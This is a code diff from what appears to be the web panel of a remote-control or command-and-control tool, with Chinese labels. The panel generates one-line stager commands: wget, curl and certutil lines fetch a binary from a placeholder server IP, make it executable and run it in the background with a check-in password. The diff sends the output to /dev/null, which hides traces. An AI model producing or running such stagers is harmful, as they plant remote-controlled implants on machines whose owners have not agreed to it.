@@ -960,13 +960,13 @@ const commands = [
   },
   {
     name: 'Wget下载',
-    code: 'wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &',
+    code: 'wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > /dev/null 2>&1 &',
     description: '使用 wget 下载并运行',
     icon: Download
   },
   {
     name: 'Curl下载',
-    code: 'curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &',
+    code: 'curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > /dev/null 2>&1 &',
     description: '使用 curl 下载并运行',
     icon: Download
   },
@@ -1006,7 +1006,7 @@ const generateWebCommand = (row: any) => {
   if (row.OS === 'windows') {
     return `certutil -urlcache -split -f ${row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${row.Pass || ''}`;
   } else {
-    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > m.log 2>&1 &`;
+    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > /dev/null 2>&1 &`;
   }
 };
 
